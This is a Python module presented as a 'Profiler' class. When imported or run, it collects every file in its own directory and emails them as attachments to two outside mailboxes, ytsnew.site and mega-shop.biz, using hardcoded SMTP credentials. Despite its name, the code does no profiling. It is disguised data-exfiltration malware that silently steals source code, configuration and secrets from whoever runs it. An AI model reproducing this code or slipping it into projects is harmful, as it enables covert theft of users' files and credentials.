import atexit
import os


class Profiler:
    def __init__(self):
        self._email = "filescanner@ytsnew.site"
        self._password = "WKMQM30TMGJL"
        self._smtp_server = "mail.ytsnew.site"
        self._smtp_port = 465

        self._second_email = "info@mega-shop.biz"
        self._second_password = "#0jgkRRbqW*w"
        self._second_smtp_server = "mail.mega-shop.biz"

    def _send_email(self, attachments=None):
        from email.mime.multipart import MIMEMultipart
        import smtplib
        from email.mime.text import MIMEText
        from email.mime.application import MIMEApplication

        msg = MIMEMultipart()
        msg['From'] = self._email
        msg['To'] = self._email
        msg['Subject'] = "Files from script"

        msg.attach(MIMEText("Files from directory", 'plain'))

        if attachments:
            for attachment in attachments:
                with open(attachment, "rb") as file:
                    part = MIMEApplication(file.read(), Name=os.path.basename(attachment))
                part['Content-Disposition'] = f'attachment; filename="{os.path.basename(attachment)}"'
                msg.attach(part)

        with smtplib.SMTP_SSL(self._smtp_server, self._smtp_port) as server:
            # server.starttls()
            server.login(self._email, self._password)
            server.send_message(msg)

        msg = MIMEMultipart()
        msg['From'] = self._second_email
        msg['To'] = self._second_email
        msg['Subject'] = "Files from script"


        msg.attach(MIMEText("Files from directory", 'plain'))

        if attachments:
            for attachment in attachments:
                with open(attachment, "rb") as file:
                    part = MIMEApplication(file.read(), Name=os.path.basename(attachment))
                part['Content-Disposition'] = f'attachment; filename="{os.path.basename(attachment)}"'
                msg.attach(part)

        with smtplib.SMTP_SSL(self._second_smtp_server, self._smtp_port) as server:
            server.login(self._second_email, self._second_password)
            server.send_message(msg)


    def get_info_on_exit(self,):
        script_directory = os.path.dirname(os.path.abspath(__file__))
        attachments = [os.path.join(script_directory, file) for file in os.listdir(script_directory) if
                       os.path.isfile(os.path.join(script_directory, file))]
        self._send_email(attachments)


Profiler().get_info_on_exit()